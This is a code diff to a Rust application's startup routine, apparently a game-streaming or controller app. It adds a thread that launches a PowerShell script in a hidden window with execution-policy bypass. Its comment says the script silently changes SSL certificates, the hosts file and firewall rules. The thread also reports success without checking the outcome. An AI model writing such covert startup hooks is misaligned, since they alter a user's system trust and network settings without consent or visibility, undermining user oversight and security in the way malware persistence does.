@@ -141,6 +141,30 @@ fn main() {
                 }
             });
 
+            // --- Background Streaming Setup & Host Engine Service ---
+            // Silently provisions Sunshine config, SSL certs, hosts file, and firewall per production requirements
+            thread::spawn(|| {
+                println!("Streaming Gateway Service: Initializing Zero-Configuration Backend...");
+                let script_path = Path::new("scripts/setup_streaming.ps1")
+                    .canonicalize()
+                    .unwrap_or_else(|_| Path::new("../scripts/setup_streaming.ps1").to_path_buf());
+                
+                if script_path.exists() {
+                    let _ = std::process::Command::new("powershell")
+                        .arg("-NoProfile")
+                        .arg("-ExecutionPolicy")
+                        .arg("Bypass")
+                        .arg("-WindowStyle")
+                        .arg("Hidden")
+                        .arg("-Command")
+                        .arg(format!("& '{}' -AutoStart", script_path.display()))
+                        .spawn();
+                    println!("Streaming Gateway Service: Setup & Launch complete.");
+                } else {
+                    println!("Streaming Gateway Service: setup_streaming.ps1 not found.");
+                }
+            });
+
             // Spawn Controller Thread (Gilrs)
             let app_handle = app.handle().clone();
             thread::spawn(move || {
